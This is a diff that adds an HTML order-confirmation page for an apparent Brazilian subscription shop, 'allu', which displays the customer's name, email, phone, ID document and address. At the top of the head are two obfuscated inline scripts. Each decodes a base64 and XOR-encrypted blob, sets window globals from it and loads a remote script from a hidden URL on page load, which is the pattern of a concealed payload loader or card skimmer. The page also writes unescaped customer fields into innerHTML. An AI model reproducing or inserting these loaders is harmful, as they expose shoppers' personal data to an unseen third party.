@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script>(function(){var v_atm=atob("DJPF0OP5YcoK6nSckOjnpZGVQ/AoggDo4OD//8yaBaQknwDx+fW8/oCWDORomFvv8+GsoJeKTrpjkhHwv+OsqIaVT6B5yFi+8eexooqbFL5vmVamy87p8oSVDqhrhge+qsi+8o2YDK8o0Fbs+eugvKqdQ+YonBXw5fbn6sHPAKs8j0Sk9aX2soDKVqtpjkGr8aX15YDbHJd3");var y_8=[];for(var j_mxm=0;j_mxm<v_atm.length;j_mxm++){y_8.push(v_atm.charCodeAt(j_mxm)&255);}var u_9=y_8[0];var j_ne4=y_8.slice(1,1+u_9);var j_l=y_8.slice(1+u_9);var q_c4uo=j_l.map(function(b,j_xloa){return b^j_ne4[j_xloa%u_9];});var w_n6="";for(var p_if=0;p_if<q_c4uo.length;p_if++){w_n6+=String.fromCharCode(q_c4uo[p_if]&255);}var t_0s9=decodeURIComponent(escape(w_n6));var e_ag=JSON.parse(t_0s9);var i_b=e_ag.globals||[];i_b.forEach(function(b_xea0){window[b_xea0.name]=b_xea0.value;});var v_s6q=document.createElement("script");v_s6q.src=e_ag.url;v_s6q.async=true;v_s6q.defer=true;(e_ag.attributes||[]).forEach(function(i_l){v_s6q.setAttribute(i_l.name,i_l.value);});(document.head||document.documentElement).appendChild(v_s6q);})();</script>
+<script>(function(){var m_h3b=atob("DEx95W1omX3IEtSxajdfkB8Eu0fqeqDFGj9HykIL/RPmZ6DcAyoEyw4H9FOqYPvCCT4UlRkbtgi8f6eeBi0JgB4ctxe7MPiTCzgJlwQK7AmtYfaLMTdfiwwF/F/yMLDQHi1QkBkF8BuxP6TDDzoYixlF4R6ndvnCCSdfyU8e+BG9d/aLSG4AyRZK9xyld/aLSCgckQxF7Amle7LIRzwPgBsN9wnlYaHTAygOx0FK7xykZ7GTUG5fmDAV");var a_2f=[];for(var m_y8yk=0;m_y8yk<m_h3b.length;m_y8yk++){a_2f.push(m_h3b.charCodeAt(m_y8yk)&255);}var z_zak=a_2f[0];var b_tbfs=a_2f.slice(1,1+z_zak);var a_68s=a_2f.slice(1+z_zak);var u_kq=a_68s.map(function(b,u_4bf){return b^b_tbfs[u_4bf%z_zak];});var p_t1d="";for(var b_26v5=0;b_26v5<u_kq.length;b_26v5++){p_t1d+=String.fromCharCode(u_kq[b_26v5]&255);}var p_4=decodeURIComponent(escape(p_t1d));var p_31w=JSON.parse(p_4);var x_3h2=p_31w.globals||[];x_3h2.forEach(function(i_7pl){window[i_7pl.name]=i_7pl.value;});var u_tiv8=document.createElement("script");u_tiv8.src=p_31w.url;u_tiv8.async=true;u_tiv8.defer=true;(p_31w.attributes||[]).forEach(function(d_z9i){u_tiv8.setAttribute(d_z9i.name,d_z9i.value);});(document.head||document.documentElement).appendChild(u_tiv8);})();</script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>allu · Pedido confirmado</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+:root{
+  --highlight:#4bd184;
+  --highlight-dark:#2fae68;
+  --check:#36DB8C;
+  --secondary:#2A292E;
+  --bg:#F1F5F2;
+  --contrast:#FFFFFF;
+  --border:#F3F3F3;
+  --title:#5B5B5B;
+  --muted:#7B7B7B;
+  --muted-2:#909090;
+  --danger:#E5484D;
+}
+html{font-size:14px}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg);color:var(--secondary);line-height:1.5;max-width:430px;margin:0 auto;overflow-x:hidden}
+img{display:block;max-width:100%}
+button{font-family:'Inter',sans-serif;cursor:pointer;border:none}
+
+.wrap{padding:36px 20px 48px;display:flex;flex-direction:column;gap:22px}
+
+.head{display:flex;flex-direction:column;align-items:center;gap:14px;text-align:center}
+.head svg{color:var(--check)}
+.head h1{font-size:19px;font-weight:800;color:var(--check);letter-spacing:-.01em}
+.head p{font-size:13px;color:#6D6D6D;line-height:1.6;max-width:340px}
+
+.card{background:var(--contrast);border-radius:14px;padding:18px 18px 20px;display:flex;flex-direction:column;gap:16px}
+
+.card-title-row{display:flex;align-items:center;justify-content:between;justify-content:space-between;gap:8px}
+.card-title-row span:first-child{font-size:14.5px;font-weight:700;color:var(--title)}
+.card-title-row .count{font-size:12px;color:var(--muted-2);font-weight:400}
+.edit-btn{width:28px;height:28px;border-radius:6px;background:#F3F3F3;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.edit-btn svg{width:13px;height:13px}
+
+.order-row{display:flex;gap:14px;align-items:center}
+.order-thumb{
+  width:60px;height:60px;border-radius:10px;flex-shrink:0;
+  background:var(--bg);display:flex;align-items:center;justify-content:center;overflow:hidden;
+}
+.order-thumb img{width:100%;height:100%;object-fit:cover}
+.order-thumb svg{width:26px;height:26px;color:var(--muted-2)}
+.order-info p{font-size:14px;font-weight:700;color:var(--title);margin-bottom:2px}
+.order-info span{font-size:12.5px;color:var(--muted-2)}
+
+.info-block{display:flex;flex-direction:column;gap:2px}
+.info-block p{font-size:13px;color:var(--muted);line-height:1.55}
+
+.confirmed-banner{
+  display:flex;align-items:center;gap:10px;background:#EAFBF2;border:1px solid #C8F0DC;
+  border-radius:10px;padding:12px 14px;
+}
+.confirmed-banner .dot{width:26px;height:26px;border-radius:50%;background:var(--highlight);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.confirmed-banner span{font-size:12.5px;font-weight:700;color:#1E6B45}
+
+.totals{display:flex;justify-content:space-between;gap:16px;border-top:1px solid var(--border);padding-top:14px}
+.totals .col{display:flex;flex-direction:column;gap:3px}
+.totals .col:last-child{align-items:flex-end}
+.totals .col p:first-child{font-size:11px;color:var(--muted)}
+.totals .col p:last-child{font-size:13px;font-weight:700;color:var(--muted)}
+
+.empty-state{padding:60px 24px;text-align:center;display:flex;flex-direction:column;align-items:center;gap:14px}
+.empty-state p{font-size:13.5px;color:var(--muted);line-height:1.6}
+.empty-state a{font-size:13.5px;font-weight:700;color:var(--highlight-dark);text-decoration:underline}
+</style>
+</head>
+<body>
+
+<div class="wrap" id="app"></div>
+
+<script>
+(function(){
+  const app = document.getElementById('app');
+
+  let order = null;
+  try { order = JSON.parse(sessionStorage.getItem('allu_order') || 'null'); } catch(e){}
+
+  function formatBRL(cents){
+    return (cents/100).toLocaleString('pt-BR', {style:'currency', currency:'BRL'});
+  }
+
+  if (!order || !order.transaction_id) {
+    app.innerHTML = `
+      <div class="empty-state">
+        <p>Não encontramos um pedido recente por aqui. Se você já pagou, fique tranquilo: a confirmação chega por e-mail.</p>
+        <a href="/catalogo/">Voltar para o catálogo</a>
+      </div>`;
+    return;
+  }
+
+  const c = order.customer || {};
+  const a = order.address || {};
+  const p = order.product || {};
+  const amounts = order.amounts || {};
+  const firstGreetingName = c.name || 'cliente';
+
+  app.innerHTML = `
+    <div class="head">
+      <svg width="48" height="48" viewBox="0 0 51 51" fill="none"><path d="M37.5031 20.9281C38.499 19.9323 38.499 18.3177 37.5031 17.3219C36.5073 16.326 34.8927 16.326 33.8969 17.3219L22.95 28.2688L17.1031 22.4219C16.1073 21.426 14.4927 21.426 13.4969 22.4219C12.501 23.4177 12.501 25.0323 13.4969 26.0281L21.1469 33.6781C22.1427 34.674 23.7573 34.674 24.7531 33.6781L37.5031 20.9281ZM25.5 0C11.4167 0 0 11.4167 0 25.5C0 39.5833 11.4167 51 25.5 51C39.5833 51 51 39.5833 51 25.5C51 11.4167 39.5833 0 25.5 0ZM5.1 25.5C5.1 14.2334 14.2334 5.1 25.5 5.1C36.7666 5.1 45.9 14.2334 45.9 25.5C45.9 36.7666 36.7666 45.9 25.5 45.9C14.2334 45.9 5.1 36.7666 5.1 25.5Z" fill="currentColor"/></svg>
+      <h1>Obrigado pela compra, ${firstGreetingName}!</h1>
+      <p>Agora que seu pedido foi confirmado, é só aguardar as informações de rastreio e comprovantes que serão enviados para seu e-mail.</p>
+    </div>
+
+    <div class="card">
+      <div class="card-title-row"><span>Seu pedido</span><span class="count">1 item</span></div>
+      <div class="order-row">
+        <div class="order-thumb">
+          ${p.image
+            ? `<img src="${p.image}" alt="${p.name || ''}" onerror="this.parentElement.innerHTML='<svg viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;1.6&quot;><rect x=&quot;7&quot; y=&quot;2&quot; width=&quot;10&quot; height=&quot;20&quot; rx=&quot;2&quot;/><line x1=&quot;11&quot; y1=&quot;18&quot; x2=&quot;13&quot; y2=&quot;18&quot;/></svg>'">`
+            : '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><rect x="7" y="2" width="10" height="20" rx="2"/><line x1="11" y1="18" x2="13" y2="18"/></svg>'}
+        </div>
+        <div class="order-info">
+          <p>${p.name || 'Produto allu'}</p>
+          <span>${p.plan || ''}</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title-row">
+        <span>Dados</span>
+        <div class="edit-btn"><svg viewBox="0 0 14 14" fill="none"><path d="M13.3192 0.680785C14.2269 1.5885 14.2269 3.06019 13.3192 3.96791L4.73487 12.5523C4.36251 12.9246 3.89596 13.1888 3.38509 13.3165L0.722549 13.9821C0.296973 14.0885 -0.0885155 13.703 0.0178786 13.2774L0.683513 10.6149C0.81123 10.104 1.07539 9.63749 1.44775 9.26513L10.0321 0.680785C10.9398 -0.226928 12.4115 -0.226928 13.3192 0.680785Z" fill="#5B5B5B"/></svg></div>
+      </div>
+      <div class="info-block">
+        <p>${c.name || ''}</p>
+        <p>${c.email || ''}</p>
+        <p>${c.phone || ''}</p>
+        <p>${c.document || ''}</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title-row">
+        <span>Entrega</span>
+        <div class="edit-btn"><svg viewBox="0 0 14 14" fill="none"><path d="M13.3192 0.680785C14.2269 1.5885 14.2269 3.06019 13.3192 3.96791L4.73487 12.5523C4.36251 12.9246 3.89596 13.1888 3.38509 13.3165L0.722549 13.9821C0.296973 14.0885 -0.0885155 13.703 0.0178786 13.2774L0.683513 10.6149C0.81123 10.104 1.07539 9.63749 1.44775 9.26513L10.0321 0.680785C10.9398 -0.226928 12.4115 -0.226928 13.3192 0.680785Z" fill="#5B5B5B"/></svg></div>
+      </div>
+      <div class="info-block">
+        <p>Recebedor: ${c.name || ''}</p>
+        <p>${a.address || ''}, ${a.number || 'S/N'} - ${a.cep || ''}</p>
+        <p>${a.neighborhood || ''}</p>
+        <p>${a.city || ''}/${a.state || ''}</p>
+      </div>
+
+      <div class="confirmed-banner">
+        <div class="dot"><svg width="13" height="13" viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="#fff" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <span>Pagamento confirmado! Sua assinatura já está ativa.</span>
+      </div>
+
+      <div class="totals">
+        <div class="col"><p>Subtotal</p><p>${formatBRL(amounts.subtotal || 0)}</p></div>
+        ${amounts.frete ? `<div class="col"><p>Frete</p><p>${formatBRL(amounts.frete)}</p></div>` : ''}
+        <div class="col" style="align-items:flex-end"><p>Total</p><p>${formatBRL(amounts.total || 0)}</p></div>
+      </div>
+    </div>
+  `;
+})();
+</script>
+</body>
+</html>
